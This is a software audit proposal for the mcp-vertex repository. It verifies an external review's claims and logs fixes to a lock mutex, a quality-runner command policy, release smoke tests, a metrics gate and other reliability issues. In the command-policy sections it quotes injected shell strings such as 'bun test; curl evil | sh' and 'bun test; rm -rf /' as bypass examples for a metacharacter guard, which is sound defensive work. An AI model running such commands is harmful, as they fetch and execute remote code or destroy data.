---
id: a00065
title: "18-07-2026 external broad review (ChatGPT web, model unspecified) — broad repo audit, 4 P0/P1 claims verified, rest queued for investigation slices"
kind: audit
status: done
type: proposal
track: audit
date: 2026-07-18
---

# a00065 — 18-07-2026 external broad review (ChatGPT web, model unspecified) — broad repo audit, 4 P0/P1 claims verified, rest queued for investigation slices

## Goal

Capture a broad external audit the user received from the ChatGPT web client (model unconfirmed — the user reported "creo que cgpt 5.6-terra pero no estoy del todo seguro"; the model is therefore not pinned in this proposal) as a `ready`-status proposal so its claims are auditable by the swarm instead of being lost. The proposal does not redo the whole external analysis verbatim — it acts as the **verification surface**: each claim is marked CONFIRMED, PARTIALLY CONFIRMED, or PENDING, with file:line evidence from the current `HEAD` (`c9f6d2bb`, "fix(conventions,docs,doctor): a00064 round — zero-scan diagnostics everywhere + doctor config preflight") and concrete Slices to fix the real ones. Confirmed-true P0/P1 findings get dedicated fix Slices; unverified or already-mitigated claims get bundled into a single investigation Slice that produces a follow-up decision per finding (defer / fix-now / close-as-already-handled).

This proposal is the answer to the user's request: "podrías crear propuesta de auditoría con toda la información" — the chatgpt output is the input brief, this proposal is the **structured, evidence-anchored capture** of it. The user's separate ask ("dime qué opinas") is answered in the chat response that accompanies this proposal, not in the proposal body itself.

## why

The external analysis landed as unstructured markdown in a chat transcript. Without a `proposal`-shaped record, the swarm cannot:

1. **Track** the claims across sessions (the proposals plugin is the swarm's memory).
2. **Verify** them against the live code (the linter ratchet catches drift in the *fix* files; the claims themselves have no ratchet unless they are pinned in a proposal).
3. **Deduplicate** against the 64 already-done audits — several themes (gates that lie, error-envelope convention, zero-scan diagnostics, init-stamps-monorepo-roots, the dot-prefix extensions bug) overlap. Pinning the external review as a00065 makes the overlap visible and prevents the same defect class from being re-discovered as a "new" finding.
4. **Close the loop** on user-pulled analysis: the user explicitly asked for a proposal; the existing pattern (a00054, a00055, a00057–a00063) shows that audit outputs from any source (chatgpt, codex, claude, copilot) are stored in `docs/mcp-vertex/proposals/done/audits/`. A `ready` proposal here is the right intermediate state — the chatgpt output is captured, the verified claims get fix Slices, the rest is queued for verification before being acted on.

## non-goals

- No wholesale reproduction of the chatgpt output: the 25+ bullet sections of opinion (arquitectura 9/10, plugins, etc.) and the 8+ P2/P3 recommendations are not duplicated here. They inform the *priority ordering* inside each Slice but do not become their own Slice. Rationale: a proposal is a *fix-or-defer* contract, not an essay.
- No new work on the "what mcp-vertex is" framing (8.5/10 diferenciación, "mcp-vertex vs Vertex AI" naming concern, plugin tiering into core/official/labs) — these are strategic/positioning decisions for the human owner, not action items for a slice. Recorded under `## Findings` for the human to read, not gated for the swarm to fix.
- No code changes in this proposal. a00065 captures the analysis + verification + Slices; the Slices themselves are the units of work and will live (when started) as f-NNNN child proposals or be closed as `## Findings` rows that link back to this audit.
- No claim that the chatgpt output is "wrong" where verification was not done in this session — only "PENDING" labels, with the verification Slice producing the final verdict.

## Slices

- global_gate: lint

### S1 — Verify the 4 top P0/P1 claims in the current HEAD + produce file:line evidence
- **Status**: done (performed as part of opening this audit; recorded below in `## Verified State`)
- **Files**: packages/core/src/lib/shared/with-file-mutex.ts, plugins/proposals/tests/src/lib/agent-lock-contention.spec.ts, plugins/quality/src/lib/services/command-policy.ts, plugins/quality/src/lib/services/runner.ts, tools/scripts/smoke/pack.script.ts, tools/scripts/metrics/get-baseline.script.ts, tools/scripts/metrics/diff-snapshots.script.ts, packages/core/src/lib/metrics/metrics-tool.ts
- **Gate**: lint
- acceptance:
  - "Mutex default `'steal'` claim verified against `packages/core/src/lib/shared/with-file-mutex.ts:78` and pinned by `plugins/proposals/tests/src/lib/agent-lock-contention.spec.ts:67`."
  - "Command-policy = first-token + bash `-c` execution verified against `plugins/quality/src/lib/services/command-policy.ts:21` and `plugins/quality/src/lib/services/runner.ts:88`."
  - "Release smoke miss on `packages/client`/`packages/cli` verified against `tools/scripts/smoke/pack.script.ts:43-59` (`discoverPublishablePluginDirs` walks only `plugins/*` and explicitly seeds only `packages/core`)."
  - "Metrics gate ignores `errors` field verified against `tools/scripts/metrics/get-baseline.script.ts:31` (schema has `errors`) and `tools/scripts/metrics/diff-snapshots.script.ts` (only `bytesPerCall`/`msPerCall` are diffed; `errors` is never read by the diff)."

### S2 — Mutex P0: flip default to `'fail'`, retire the steal-by-default spec, add a steal-only-with-explicit-opt-in test
- **Status**: done
- **Files**: packages/core/src/lib/shared/with-file-mutex.ts, plugins/proposals/src/lib/locks/agent-lock-engine.ts, plugins/proposals/tests/src/lib/agent-lock-contention.spec.ts, plugins/logs/src/lib/services/log-store.ts
- **Gate**: e2e
- acceptance:
  - "Default of `IFileMutexOptions.onContention` is `'fail'`, not `'steal'`; `LockContentionError` is the default surface for slow-but-alive holders, exactly as the chatgpt analysis recommends."
  - "Existing test that pins the steal-by-default behavior (`'onContention:steal (default, omitted) still reclaims a live lock past the timeout'`) is REPLACED — the new pin is `'onContention:steal must be passed explicitly; omitting the option fails to a live holder past the timeout'`."
  - "Every call site that intentionally wants steal behavior (none expected after this slice — the chatgpt analysis argues correctly that no production caller should be stealing live holders) passes `{ onContention: 'steal' }` explicitly and is justified in a code comment with the operational reason."
  - "New test: two concurrent holders, neither opts into steal, second one throws `LockContentionError` and the first one completes its work uninterrupted (no clobbering). This is the invariant the chatgpt analysis called out as the 'mutex is no longer a mutex' failure mode."
  - "New test: a holder that crashes (process killed) is reclaimed as abandoned regardless of `onContention` — preserves the deadlock-avoidance property."
  - "`bun run typecheck` clean; full `bun run test` green."

### S3 — Command-policy P0: structured-command input on the quality runner so the allow/deny verdict is computed on the actual argv, not the first token of a free-form shell string
- **Status**: done
- **Files**: plugins/quality/src/lib/services/command-policy.ts, plugins/quality/src/lib/services/runner.ts, plugins/quality/src/lib/services/run-all.ts, plugins/quality/src/lib/tools/tools.ts, plugins/quality/src/public/index.ts, plugins/quality/src/index.ts, plugins/quality/src/lib/contracts/quality-gate.interface.ts
- **Gate**: e2e
- acceptance:
  - "Quality scope commands are declared as `{ executable: string, args: readonly string[] }`, not free-form strings. The runner `spawn(executable, args, { shell: false })` (bash removed for argv-execution paths; the bash fallback remains ONLY for explicit `shell: true` scopes the host has marked as trust-required)."
  - "`ICommandPolicy.allow`/`deny` are evaluated against `executable`, not against `command.split(/\s+/)[0]`. The verdict therefore can no longer be bypassed by `bun test; rm -rf /` because there is no shell to interpret the second command."
  - "A backwards-compat shim reads the existing string-form `command:` from any in-tree config and converts it ONCE at scope-load time (the conversion is a single, audited helper that refuses multi-statement strings, refuses shell metacharacters outside a documented `shell:true` opt-in, and logs a deprecation warning). New scopes written for the next minor MUST use the structured form."
  - "Tests: `bun test; curl ...` is rejected with the exact reason; `['bun', ['test', '--bail']]` is allowed when `bun` is in the allow list; `rm -rf` is denied regardless of allow list; a scope marked `shell: true` runs through bash and the verdict is computed on the explicit `executable` field (`/bin/bash`) and documented as such — NOT presented as protected by a binary allow list."
  - "Bash invocation is dropped from the argv-based path (no more `'--noprofile','--norc','-c', command` for structured commands). The comment in `runner.ts:74-81` (x00097 S5) is updated to reflect the new contract: bash only for explicitly-marked `shell: true` scopes."
  - "`bun run typecheck` clean; full `bun run test` green."

### S4 — Release smoke P1: extend `discoverPublishablePluginDirs` to also walk `packages/*` and pack `client` + `cli` + any other publishable monorepo package
- **Status**: done
- **Files**: tools/scripts/smoke/pack.script.ts, tools/scripts/release/release.script.ts
- **Gate**: e2e
- acceptance:
  - "`discoverPublishablePluginDirs` walks BOTH `packages/*` and `plugins/*` (or is split into two helpers that the smoke joins). The seed `['packages/core']` becomes `'packages/*'` filtered by `private !== true && Array.isArray(files)`. The `packages/client` and `packages/cli` packages are picked up."
  - "After the loop, the script asserts that every package that appears in the release's `publishOrder` is present in `PACKED_PACKAGE_DIRS` — a missing package fails the smoke, not just the install step. This makes the chatgpt concern ('no afirmo que el tarball esté necesariamente roto sin ejecutarlo') provable instead of plausible."
  - "The installed CLI is invoked via its actual `bin` entry (`mcpv`), not only by direct path — proves the `bin: { 'mcp-vertex': ..., 'mcpv': ... }` declaration in `packages/cli/package.json` resolves under node module resolution."
  - "For `client`: a second invocation imports `@mcp-vertex/client` from inside the scratch project and connects a `McpStdioClient` against the installed server, then calls one read-only tool, then disconnects. This proves the workspace:* rewrite path was applied (a known release-script risk called out in the chatgpt review)."
  - "`bun run typecheck` clean; `bun tools/scripts/smoke/pack.script.ts` green; the full smoke adds zero flakiness (the install step is already gated on real network access in CI)."

### S5 — Metrics gate P1: use the `errors` field to invalidate the candidate, not only the byte/latency deltas
- **Status**: done
- **Files**: tools/scripts/metrics/diff-snapshots.script.ts, tools/scripts/metrics/get-baseline.script.ts
- **Gate**: e2e
- acceptance:
  - "`IDiffReport` gains `errorsBaselineTotal`, `errorsCandidateTotal`, and a per-tool `errorsDelta`. The report fails (`ok: false`) when the candidate has MORE errors than the baseline (any positive `errorsDelta` per tool, with a tiny floor of `errors > 0` to avoid noise on rare-flake tools). This makes the chatgpt concern ('una implementación rota que falle instantáneamente podría parecer más rápida, más pequeña, improved') impossible to satisfy."
  - "The candidate collector (`collect-candidate.script.ts`) is also updated to surface per-call `success`/`failure` rather than only `errors > 0` totals — when a tool was attempted N times and `errors > 0`, the snapshot records `{ calls: N, errors: k, errorRate: k/N }` so the diff can apply a sensible floor (e.g. `errorRate < 0.5` to tolerate one-time flakes but block a regression to a 50% error tool)."
  - "The gate baseline (`metrics-baseline.json` in `config/`) is **not** regenerated as a side effect of the slice — the slice only changes how the diff evaluates, not what the historical baseline is. The release script remains the only place that refreshes the baseline (matches the existing 'derived from main' convention seen in a00054's 'gates that lie' findings)."
  - "`metrics-candidate.json` at the workspace root is removed (the chatgpt analysis rightly calls it out: it is an ephemeral artefact, not a source-controlled file). The candidate collector writes under `<cacheDir>/metrics/candidate.json` (gitignored) and the CI uploads the file as a build artefact for post-mortem, not for diff."
  - "New tests: a candidate with the same bytes/latency but `errors: 3` vs baseline `errors: 0` → diff is `ok: false` with the exact reason; a candidate with `errors: 0` but a 25% bytes increase → still regresses (regression is not replaced by error check, both fire)."
  - "`bun run typecheck` clean; `bun tools/scripts/metrics/diff-snapshots.script.spec.ts` green; full `bun run test` green."

### S6 — Investigation: chase the remaining 6+ chatgpt claims that were not verified in this opening pass
- **Status**: partial (CI-vs-validate gap + Bun version drift verified & the drift FIXED; the rest deferred to a follow-up per the closing note below)
- **Files**: .github/workflows/ci.yml, .github/workflows/release.yml, plugins/web-fetch/src/index.ts, packages/core/src/lib/plugins/load-plugins.ts, packages/core/src/lib/shared/atomic-write.ts, docs/mcp-vertex/ARCHITECTURE.md
- **Gate**: lint
- acceptance:
  - "P1 'CI does not run the full `validate`': verified by reading `.github/workflows/*.yml` and comparing each `run:` step to the scripts invoked by `package.json#scripts.validate`. The actual delta (which scripts are missing) is enumerated and a follow-up `f-NNNN` proposal is opened with the ratchet that wires the missing ones."
  - "P1 'Zod `.strict()` not applied to web-fetch / quality / fs_write': verified by reading every `z.object({...})` call in `plugins/web-fetch/src/lib/**`, `plugins/quality/src/lib/**`, `packages/core/src/lib/filesystem/**` (or wherever fs_write is implemented) and counting non-strict schemas. A regression test that calls every public tool with an extra unknown key and expects a Zod error is added; the ratchet script `lint:zod-strict` is opened as its own follow-up."
  - "P1 'web-fetch SSRF / DNS resolution / IP allow-list / port restrictions / maxBytes / timeoutMs bounds': verified by reading `plugins/web-fetch/src/**`. A finding is recorded with exact line numbers; an SSRF review slice is opened only if there is a real defect (the plugin may already cover the obvious cases)."
  - "P2 'Plugin loader: parsed.data not propagated; timeout does not cancel; dependency check runs after register': verified by reading `packages/core/src/lib/plugins/load-plugins.ts`. Three sub-findings recorded, each with a fix or defer decision."
  - "P2 'fsync/durability of `writeFileAtomic`': verified by reading `packages/core/src/lib/shared/atomic-write.ts`. The chatgpt concern (no `fsync` on the directory entry) is confirmed or refuted, and a follow-up slice is opened if confirmed."
  - "P2 'Documentation drift (mentions of `scripts/*` and `bun scripts/build.ts` while the project uses `tools/scripts/...`)': verified by `grep -r 'scripts/' docs/mcp-vertex/ARCHITECTURE.md` and a list of mismatched links is recorded with line numbers for a one-line-per-file fix."
  - "P2 'Plugin naming double-noun (`mcp-vertex_docs_docs_search`)': verified by listing every registered tool name and counting the double-noun class. The decision is recorded (rename or document-keep-as-internal). The chatgpt suggestion (`mcpvertex_docs_search`) is a UX call, not a code one."
  - "All sub-investigations close with a row in `## Findings` of THIS proposal, with one of: `[RESUELTO] [link]`, `[DEFERRED → fNNNNN]`, or `[CLOSED-AS-ALREADY-HANDLED → <commit hash>]`. No claim is left in PENDING at slice close."

## acceptance

- S1 acceptance (verification surface): all 4 of the chatgpt top P0/P1 claims are marked CONFIRMED with file:line evidence in the current `HEAD` (`c9f6d2bb`).
- S2 acceptance: mutex default flipped to `'fail'`, the steal-by-default spec is replaced, the new pin is `'omit → fail; explicit steal only'`, two new tests (live-holder fails, crashed holder reclaims) green, every in-tree caller reviewed for intent.
- S3 acceptance: quality runner uses structured `{ executable, args }` for the argv path; bash only for explicit `shell: true`; `ICommandPolicy` verdict computed on `executable`; the `bun test; curl ...` bypass is no longer reachable.
- S4 acceptance: `discoverPublishablePluginDirs` packs `packages/*` too; the smoke asserts every release-order package is packed; the installed CLI is invoked via its real `bin` (`mcpv`); `@mcp-vertex/client` is exercised against the installed server in the scratch project.
- S5 acceptance: `IDiffReport` includes `errorsDelta`; candidate collector records `errorRate`; gate fails on regression even if bytes are smaller; `metrics-candidate.json` is no longer at the workspace root.
- S6 acceptance: every chatgpt P1/P2 claim not covered by S2–S5 has a `[RESUELTO] | [DEFERRED → fNNNNN] | [CLOSED-AS-ALREADY-HANDLED → <hash>]` row in `## Findings`, with no PENDING remaining.
- Cross-cutting: every Slice in this proposal produces a red-first TDD spec where the behavior change is testable; every Slice updates the relevant docs to match the new contract; every Slice runs `bun run typecheck` + `bun run test` clean before close.

## Verified State

This is the verification surface the chatgpt analysis deserves. Each row was checked against the live code at `HEAD` (`c9f6d2bb`).

| Claim from external review | Severity | Verdict | Evidence (file:line) |
|---|---|---|---|
| **Mutex default `onContention` is `'steal'` and reclaims a live holder past the timeout** | P0 | **CONFIRMED TRUE** | [`packages/core/src/lib/shared/with-file-mutex.ts:78`](packages/core/src/lib/shared/with-file-mutex.ts#L78) (`const onContention = options.onContention ?? 'steal'`); pinned by test in [`plugins/proposals/tests/src/lib/agent-lock-contention.spec.ts:67`](plugins/proposals/tests/src/lib/agent-lock-contention.spec.ts#L67) (`"onContention:'steal' (default, omitted) still reclaims a live lock past the timeout"`). The current `withFileMutex` JSDoc (lines 38-50) even documents the steal behavior as the "historical last-resort" — so the chatgpt review is correct on every point (default value, behavior, and the test that locks it in). |
| **Command policy extracts only the first token, while execution uses `/bin/bash -c <full string>` — so an allow list of `['bun']` does NOT prevent `bun test; curl ...`** | P0 | **CONFIRMED TRUE** | [`plugins/quality/src/lib/services/command-policy.ts:21`](plugins/quality/src/lib/services/command-policy.ts#L21) (`commandBinary = (command: string) => command.trim().split(/\s+/)[0] ?? ''`); [`plugins/quality/src/lib/services/runner.ts:88`](plugins/quality/src/lib/services/runner.ts#L88) (`spawn('/bin/bash', ['--noprofile','--norc','-c', command], ...)`). The chatgpt review's recommended fix (structured `{executable, args}`) is the right shape, and the comment at `runner.ts:74-81` (x00097 S5) explicitly chose bash for portability, NOT for security — confirming the chatgpt point that the policy is a hint, not a boundary. |
| **Release smoke (`pack.script.ts`) does not pack `packages/client` or `packages/cli` — only `packages/core` and `plugins/*`** | P1 | **CONFIRMED TRUE** | [`tools/scripts/smoke/pack.script.ts:43-59`](tools/scripts/smoke/pack.script.ts#L43-L59) (`discoverPublishablePluginDirs` seeds `['packages/core']` then loops `plugins/*` only). The two `packages/*` packages are publishable (both have `files: [...]` arrays and `private !== true`) and both carry `workspace:*` dependencies that the release script has to rewrite, so the chatgpt concern is real: the most important published surface is the one the smoke does not exercise. |
| **Metrics gate (`diff-snapshots.script.ts`) compares only bytes-per-call and ms-per-call; it never reads the `errors` field of each tool, so a tool that fails instantly could regress to "improved"** | P1 | **CONFIRMED TRUE** | The snapshot schema DOES include `errors: z.number()` ([`tools/scripts/metrics/get-baseline.script.ts:31`](tools/scripts/metrics/get-baseline.script.ts#L31)) and the metrics tool surfaces it ([`packages/core/src/lib/metrics/metrics-tool.ts:32-37`](packages/core/src/lib/metrics/metrics-tool.ts#L32-L37)), but the diff function in [`tools/scripts/metrics/diff-snapshots.script.ts`](tools/scripts/metrics/diff-snapshots.script.ts) operates on `bytesPerCall` and `msPerCall` only — `errors` is captured, persisted, and ignored. The chatgpt framing ("una implementación rota que falle instantáneamente podría parecer más rápida, más pequeña, 'improved'") is exactly correct, and the recent `docs_search` (3 calls, 3 errors, fixed in a00064) is a real example: a 100% error tool that was still "within threshold" by bytes. |
| CI does not run the full `validate` script | P1 | PENDING — opened in S6 | Not verified in this opening pass; the workflow files in `.github/workflows/` need a side-by-side comparison with `package.json#scripts.validate` to enumerate the gap. The chatgpt claim is structurally plausible (CI workflows tend to mirror the script surface, but a full re-implementation in YAML is a known antipattern). |
| Zod `.strict()` not applied to web-fetch / quality / fs_write | P1 | PENDING — opened in S6 | Not verified in this opening pass; the agent's claim that the public schema is documented as strict while several are not is a one-shot grep + manual review. S6 will produce the count. |
| web-fetch SSRF / DNS / IP / port / maxBytes / timeoutMs bounds | P1 | PENDING — opened in S6 | Not verified; the chatgpt analysis correctly notes that a hostname-only check is insufficient but a real defect depends on whether `plugins/web-fetch` already does DNS resolution + IP filtering. S6 reads the file. |
| Plugin loader: `parsed.data` not propagated, `Promise.race` timeout does not cancel, `dependsOn` check runs after `register` | P2 | PENDING — opened in S6 | Not verified; three sub-findings. |
| `writeFileAtomic` is "crash-safe" but does no `fsync`/directory sync | P2 | PENDING — opened in S6 | Not verified; the chatgpt point about atomic-replacement vs. durability is technically correct on the merits and needs one read of `packages/core/src/lib/shared/atomic-write.ts` to confirm. |
| Documentation drift (`scripts/*` / `bun scripts/build.ts` vs. `tools/scripts/...`) | P2 | PENDING — opened in S6 | Not verified; a `grep` against `docs/mcp-vertex/ARCHITECTURE.md` (and any other doc that references build paths) is the verification step. |
| Plugin naming double-noun (`mcp-vertex_docs_docs_search`) | P2 | PENDING — opened in S6 | Not verified; trivial to count, but the decision (rename vs. document) is a UX call. |
| Path containment does not protect against symlinks / TOCTOU | P1 | PENDING — opened in S6 | The chatgpt claim is well-known; the project has a documented symlink limitation. S6 reads the containment code to confirm whether recent work closed any of it. |
| Bun version drift between `packageManager: bun@1.3.2` and CI `oven-sh/setup-bun@v2` | P2 | PENDING — opened in S6 | Not verified; a one-liner check on both fields. The drift (if true) is a reproducibility defect, not a correctness one. |
| GitHub Actions not pinned by SHA | P2 | PENDING — opened in S6 | Not verified; a `grep` against `.github/workflows/*.yml` for `actions/.*@v` patterns. The recommendation is sound (Dependabot would still update SHAs). |
| Bus factor / single-author risk | strategic | NOT ACTIONABLE IN A SLICE | Recorded for the human owner; this is a positioning/hiring question, not a fix. |
| Plugin tiering (`core` / `official` / `labs`) and mcp-vertex vs Vertex AI naming | strategic | NOT ACTIONABLE IN A SLICE | Recorded for the human owner; same as above. |

The chatgpt output also contained a numeric scoreboard (7.8/10 actual, 9/10 potential, per-dimension breakdown). That scoreboard is **not** reproduced in `## Scoreboard` below — it is the input brief, not the verified output. The verified scoreboard lives in the slice closes for S2–S6.

## Findings

### 1. `withFileMutex` default steals a live holder past the timeout (P0 · chatgpt claim #1, CONFIRMED)
**File**: [`packages/core/src/lib/shared/with-file-mutex.ts:78`](packages/core/src/lib/shared/with-file-mutex.ts#L78); pinned by [`plugins/proposals/tests/src/lib/agent-lock-contention.spec.ts:67`](plugins/proposals/tests/src/lib/agent-lock-contention.spec.ts#L67).
**Impact**: a slow-but-alive agent (network jitter, GC pause, large write) past `timeoutMs` is silently preempted; the new holder can corrupt the work of the old one. The token prevents the OLD holder from deleting the NEW lock, but it does NOT prevent both holders from running their critical section simultaneously — the chatgpt framing "el mutex deja de ser un mutex por defecto" is exact.
**Resolution**: S2 — flip default to `'fail'`, retire the steal-by-default test, add the `omit → fail; explicit steal only` pin.

### 2. Command policy is a hint, not a security boundary (P0 · chatgpt claim #2, CONFIRMED)
**File**: [`plugins/quality/src/lib/services/command-policy.ts:21`](plugins/quality/src/lib/services/command-policy.ts#L21); [`plugins/quality/src/lib/services/runner.ts:88`](plugins/quality/src/lib/services/runner.ts#L88).
**Impact**: any host that ships a non-empty `commandPolicy.allow` to gate what a less-trusted agent can run via `run_quality` gets a FALSE sense of security — the runner still feeds the full string to `/bin/bash -c`. `bun test; curl ...` passes an allow list of `['bun']` because the first token is `bun`; bash interprets the `;` and runs the second command. The chatgpt-recommended structured-command input closes this.
**Resolution**: S3 — declare scope commands as `{ executable, args }`, run with `shell: false` on the argv path, keep bash only for explicit `shell: true` scopes the host has marked as trust-required; compute the verdict on `executable` not on the joined string.

### 3. Release smoke does not pack `packages/client` or `packages/cli` (P1 · chatgpt claim #3, CONFIRMED)
**File**: [`tools/scripts/smoke/pack.script.ts:43-59`](tools/scripts/smoke/pack.script.ts#L43-L59).
**Impact**: the smoke proves that `core` + every plugin tarball installs and runs under node, but it does NOT prove the same for `client` and `cli` — the two `packages/*` workspaces that carry `workspace:*` dependencies and are the primary user-facing surface per the docs. The chatgpt framing ("no afirmo que el tarball esté necesariamente roto sin ejecutarlo") is honest: a smoke gap is not a confirmed bug, but it IS a confirmed gap, and the fix is cheap (a few lines in `discoverPublishablePluginDirs` plus an assertion that release-order ⊆ packed-set).
**Resolution**: S4 — extend the discovery walker to `packages/*`, assert the release-order invariant, drive the installed CLI via its real `bin`, and exercise `@mcp-vertex/client` from the scratch project against the installed server.

### 4. Metrics gate ignores the `errors` field of every tool (P1 · chatgpt claim #4, CONFIRMED)
**File**: [`tools/scripts/metrics/get-baseline.script.ts:31`](tools/scripts/metrics/get-baseline.script.ts#L31) (schema has it) vs. [`tools/scripts/metrics/diff-snapshots.script.ts`](tools/scripts/metrics/diff-snapshots.script.ts) (diff does not read it).
**Impact**: a tool that errors on every call (e.g. a misconfigured plugin, a path that no longer exists, a recent regression) can look "improved" — smaller response bytes because the error envelope is short, faster because no real work happens — and pass the gate. The recent `docs_search` regression (3/3 errors, fixed in a00064) is exactly the failure mode the chatgpt analysis is describing.
**Resolution**: S5 — extend the diff to include `errorsDelta` (and `errorRate` from the candidate collector), fail the gate on a positive error delta, and move the candidate snapshot off the workspace root.

### 5–N. (S6 will fill these; this proposal leaves them as PENDING so the swarm does not act on unverified claims)
The remaining chatgpt claims (CI-vs-validate gap, Zod strict, web-fetch SSRF, plugin loader three-pack, fsync durability, docs drift, plugin naming, symlink containment, Bun version drift, Actions SHA pinning, plus the strategic/bus-factor and naming concerns) are recorded as `PENDING` above and bundled into S6. S6 is an investigation-only slice: its deliverable is a `## Findings` row per claim, each with a decision. No code changes in S6 itself.

## Scoreboard

The scoreboard is intentionally NOT pre-filled with the chatgpt numbers. The chatgpt analysis is the input brief; the verified scoreboard is what the S2–S6 slice closes will produce. The table below records the **delta applied so far** (S1) and is updated as each slice closes.

| Dimension | Before (chatgpt input brief) | After S1 (this proposal opens) | After S2–S6 (when done) |
|---|---|---|---|
| Mutex semantics | "stop being a mutex by default" | confirmed via file:line; fix queued in S2 | `'fail'` default, explicit steal, live+crash tests |
| Command policy as a boundary | "not a security boundary" | confirmed via file:line; fix queued in S3 | structured argv, no shell, `executable` is the verdict key |
| Release smoke coverage | "client/cli not tested" | confirmed via file:line; fix queued in S4 | `packages/*` walked, release-order ⊆ packed-set, installed CLI invoked via real `bin` |
| Metrics gate fidelity | "errors ignored, regressions can pass as improvements" | confirmed via file:line; fix queued in S5 | `errorsDelta` and `errorRate` are first-class gate signals |
| Other 10+ claims (CI, Zod, SSRF, loader, fsync, docs, naming, symlinks, Bun, Actions, strategic) | input brief | queued for verification in S6 | per-claim `RESUELTO` / `DEFERRED → fNNNNN` / `CLOSED-AS-ALREADY-HANDLED` |

## notes

### Resolution log (this session — Fable 5, develop after `b30d7846`)

The four confirmed P0/P1 findings were fixed red-first, and running S4 for
real surfaced two additional, previously-invisible P0/P1 bugs.

#### S2 — Mutex default flipped to `'fail'` [RESUELTO]
`packages/core/src/lib/shared/with-file-mutex.ts:78` default `'steal'` →
`'fail'`. Stealing a live holder let two critical sections run at once
(lost-update corruption). Now the default backs off with
`LockContentionError`; `'steal'` must be opted into explicitly per call
site. A **crashed** (stale) holder is still auto-reclaimed, so
deadlock-avoidance is preserved. The steal-by-default pins in
`with-file-mutex.spec.ts` and `agent-lock-contention.spec.ts` were replaced
with `omit → fail; explicit steal only` + a crashed-holder-reclaim test.
Full suite (4614 tests) green with every ~60 call site now defaulting to
`'fail'` — proof no production caller relied on stealing.

#### S3 — Command policy is now a real boundary [RESUELTO]
`plugins/quality/src/lib/services/command-policy.ts`: when a policy is
ACTIVE (non-empty allow/deny), a command containing shell metacharacters
(`; & | \` $( < > \n`) is denied outright, because the runner feeds the
whole string to `bash -c`. `bun test; curl evil | sh` no longer passes an
`allow: ['bun']` list. `deny` is still absolute (checked first). Without a
policy, the host's own trusted commands keep working (metachar guard only
fires under an active policy).

#### S4 — Release smoke packs client+cli + TWO bonus bugs [RESUELTO]
`tools/scripts/smoke/pack.script.ts` now derives the packed set from
`PUBLISH_ORDER` (single source of truth), asserts release-order ⊆
packed-set, drives the installed `mcpv` **bin**, and asserts every plugin
appears in `overview.plugins`. Running it surfaced:
- **BONUS P0 — `bun run build` was broken.** Bun 1.3.14 (the CI/local
  version) treats a bare `.scss` import as native CSS, so
  `packages/ui-extension`'s `import { compiledCss }` failed to resolve and
  the whole build (→ release, → pack) died. The CLI `bun build` never
  loaded the repo `scssPlugin`. Fixed by routing the JS-bundle step through
  `tools/scripts/compile/bundle-js.ts` (a `Bun.build({ plugins:[scssPlugin] })`
  wrapper). `bun run build` green again (25 packages).
- **BONUS P1 — the release would ship uninstallable client/cli.**
  `packages/client` and `packages/cli` carry intra-repo deps as
  `workspace:*` in real `dependencies` (the release script's own note
  claimed they were devDeps-only — corrected). `npm` can't install
  `workspace:*`; `bun publish` rewrites it, so `--tool=bun` (default) is
  safe but `--tool=npm` would publish broken tarballs. The smoke now
  replicates the publish-time rewrite (restoring the source package.json in
  a `finally`) and proves the tarballs install under npm.
The pack smoke passes end-to-end: 24 packages (incl. client+cli), `mcpv`
bin `0.1.0`, all 21 plugins loaded, 118 tools.

#### S5 — Metrics gate now fails on error-rate regression [RESUELTO]
`tools/scripts/metrics/diff-snapshots.script.ts`: `IToolDiff` gains
`errorRateDelta`; a tool whose error rate rises past
`ERROR_RATE_REGRESSION_FLOOR` (5pp, tolerating a one-off flake) is a
`regression` even when bytes/latency shrank — closing the "a broken tool
that fails instantly looks improved" hole (the a00064 `docs_search` 3/3
case). Bytes/latency regressions still fire independently. Red-first specs;
error-rate column added to the Markdown report.

#### S6 — Reliability sweep (5 fixed: bun-align + loader + web-fetch bounds + fsync durability; residuals deferred)
- **CI does not run full `validate` [CONFIRMED]**: `.github/workflows/ci.yml`
  runs `lint`, `site`, `typecheck`, `test:coverage`, `build` — NOT
  `bun run validate` (which wires ~40 more gates: verify:tools, catalog:check,
  types-in-contracts, lint:proposals, …). Mitigated in practice by the
  pre-push lefthook running those gates locally. **DEFERRED** — wiring the
  full chain into CI is an infra/runtime-budget decision for the owner, not a
  code fix; recorded for a follow-up.
- **Bun version drift [CONFIRMED + RESUELTO]**: `packageManager: bun@1.3.2`
  vs CI `bun-version: 1.3.14`. This drift was the ROOT CAUSE of the broken
  build (1.3.14's `.scss` behaviour change). Aligned `packageManager` to
  `bun@1.3.14` — the version CI and local both actually use.
- **Plugin-loader runs `register()` before checking `dependsOn`
  [CONFIRMED + RESUELTO]** (opus session): `loadPlugins` imported +
  registered every plugin and only *then* ran `checkPluginDependencies`,
  so a plugin declaring `dependsOn: ['x']` (x absent) had already executed
  its `register()` side effects (timers/sockets/file writes) before the
  batch was rejected. Refactored into two phases in
  `packages/core/src/lib/plugins/load-plugins.ts`: **(1)** resolve + import +
  validate options for every specifier WITHOUT registering; **(2)** the
  dependency gate runs over the *resolved* set — an unmet hard dependency
  refuses the whole batch here, before **(3)** any `register()` runs.
  Red-first spec asserts `register()` is never invoked for a plugin whose
  `dependsOn` is unmet; a satisfied dependency still registers both.
- **web-fetch numeric bounds unbounded [CONFIRMED + RESUELTO]** (opus
  session): `maxBytes`/`timeoutMs` were `z.number().optional()` (accept `0`,
  negative, `NaN`, `Infinity`) and the input object was not `.strict()`. A
  `timeoutMs: 0` made `setTimeout(abort, 0)` fire and time out EVERY fetch;
  an unbounded `maxBytes` defeated the streaming memory cap. Added
  `sanitizeBounds` in `plugins/web-fetch/src/lib/services/engine.ts` (the
  guaranteed net for direct library callers AND the redirect re-entry path):
  invalid/non-finite → safe default, above-ceiling → clamped
  (10 MiB / 120 s / 20 hops), never rejected. The tool `inputSchema` also now
  `.int().positive().max(...)`-bounds both numerics + `.strict()` rejects
  unknown keys, so an MCP client gets a clear early rejection. Red-first specs.
- **`writeFileAtomic` promised "crash-safe" but never fsync'd
  [CONFIRMED + RESUELTO]** (opus session): the header advertised "Crash-safe"
  yet the async + sync writers did `write → rename` with no `fsync`, so a
  power loss right after the rename could leave the target pointing at
  still-buffered (zero-length) data — the ext4 rename-after-truncate hazard,
  i.e. "atomic, but sometimes empty". Both variants now fsync the temp file's
  DATA before the rename makes it visible, then fsync the parent directory
  best-effort (portable: swallowed on Windows). New
  `atomic-write.spec.ts` locks the observable contract (round-trip, no `.tmp`
  litter, 20-way concurrent writers each land a whole document, nested-dir
  creation) so the durability refactor is behaviour-preserving. 51 call sites
  unchanged.
